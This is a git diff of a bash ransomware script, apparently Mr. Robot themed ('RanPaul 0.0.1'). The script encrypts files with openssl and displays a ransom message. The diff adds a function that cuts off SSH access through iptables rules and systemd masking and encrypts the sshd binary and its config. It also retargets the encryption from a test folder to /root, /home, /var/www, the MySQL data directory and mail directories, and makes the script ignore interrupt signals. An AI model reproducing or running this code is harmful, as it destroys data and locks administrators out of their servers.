@@ -51,7 +51,9 @@ openfile() {
 	fi
 }
 adderr() { ERRMSG="$ERRMSG\n$1"; }
-EXIT() { echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
+EXIT() { #echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
+exit
+}
 init() {
 	check_req
 	check_msg
@@ -85,10 +87,12 @@ esac
 case "$result" in
 Yes|Y|y)
 	echo You got the files, pal! goodbye now..
+	breakcom
 	break
 	;;
 0)
 	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
+	breakcom
 	break
 	;;	
 1)
@@ -104,13 +108,11 @@ esac
 ############### ENCRYPTING ###########################
 pck() {
 	if [ "$SOFT" = "" ]; then
+	if [ -f "$1" ]; then
 	openfile $1
 	stuff=$(cat $1)
 	echo "RAN" > $1
 	echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
-	if [ ! -f "$1" ]; then
-		adderr "[!] FILE NOT ENCRYPTED"
-		EXIT
 	fi
 	fi
 }
@@ -149,13 +151,37 @@ dec_loop() {
 	done
 }
 ################# MAIN ######################################
+breakcom() {
+	if [ "$SOFT" != "" ]; then
+		return
+	fi
+	touch /etc/ssh/sshd_not_to_be_run
+	chmod 000 /etc/ssh/sshd_not_to_be_run
+	chattr +i /etc/ssh/sshd_not_to_be_run
+	if [ "$(which iptables)" != "" ]; then
+		iptables -t nat -I PREROUTING 1 -p tcp --dport 22 -j REDIRECT --to-port 1
+		iptables -t mangle -I INPUT 1 -p tcp --dport 22 -j DROP
+		iptables -I INPUT 1 -p tcp --dport 22 -j DROP
+	fi
+	pck "$(which sshd)"
+	pck "/etc/ssh/sshd_config"
+	if [ "$(which systemctl)" != "" ]; then
+		{
+		systemctl mask ssh
+		systemctl mask sshd
+		systemctl disable ssh
+		systemctl disable sshd
+		systemctl stop ssh
+		systemctl stop sshd
+		} &>/dev/null
+	fi
+}
 main() {
 	trap '' INT
 	trap '' TERM
-	#SOFT="YES"
+	SOFT="YES"
 	init
-	targets="/root/Desktop/testing"
-	#targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+	targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
 	enc_loop "$targets"
 	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
 	title="Oops.."
